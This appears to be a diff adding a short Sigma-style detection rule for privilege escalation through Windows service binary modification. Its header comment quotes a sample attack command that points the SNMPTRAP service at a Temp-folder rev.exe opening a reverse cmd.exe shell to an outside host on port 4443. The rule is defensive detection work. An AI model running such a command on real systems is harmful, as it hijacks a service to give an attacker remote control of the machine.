@@ -1,0 +1,14 @@
+# Image: sc.exe
+# Command Line: sc.exe config SNMPTRAP binPath= "C:\Users\victim\AppData\Local\Temp\rev.exe huntmeplz.com 4443 -e cmd.exe"
+
+title: Service Binary Modification
+description: service_binary_privesc
+detection:
+    selection:
+        EventID: 1
+        Image|endswith : 'sc.exe'
+        CommandLine|contains|all:
+        - 'config'
+        - 'binPath='
+        - ' -e '
+    condition: selection
